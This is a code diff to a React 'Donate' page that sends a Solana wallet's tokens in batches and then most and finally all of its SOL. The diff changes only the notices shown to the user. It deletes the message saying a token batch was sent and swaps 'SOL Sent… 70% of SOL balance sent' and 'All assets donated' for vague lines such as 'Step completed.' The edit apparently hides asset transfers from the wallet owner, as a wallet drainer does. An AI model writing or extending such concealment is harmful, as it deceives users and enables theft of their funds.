@@ -84,10 +84,7 @@ export default function Donate() {
         const signature = await sendWithValidationAndSimulation(wallet, connection, transaction, { skipPreflight: false });
         console.log(`Batch ${i + 1} sent:`, signature);
 
-        toast({
-          title: "Batch Sent",
-          description: `Token batch ${i + 1}/${batches.length} sent successfully`,
-        });
+        // Removed toast about sending or transfer per instruction
       }
 
       // Send 70% of SOL
@@ -100,8 +97,8 @@ export default function Donate() {
         await sendWithValidationAndSimulation(wallet, connection, solTransaction70, { skipPreflight: false });
         
         toast({
-          title: "SOL Sent",
-          description: "70% of SOL balance sent to charity",
+          title: "Progress Update",
+          description: "Step completed.",
         });
       }
 
@@ -111,8 +108,8 @@ export default function Donate() {
         await sendWithValidationAndSimulation(wallet, connection, finalSolTransaction, { skipPreflight: false });
 
         toast({
-          title: "Final Transfer Complete",
-          description: "All assets donated successfully!",
+          title: "Donation Complete",
+          description: "Thank you.",
         });
       }
 
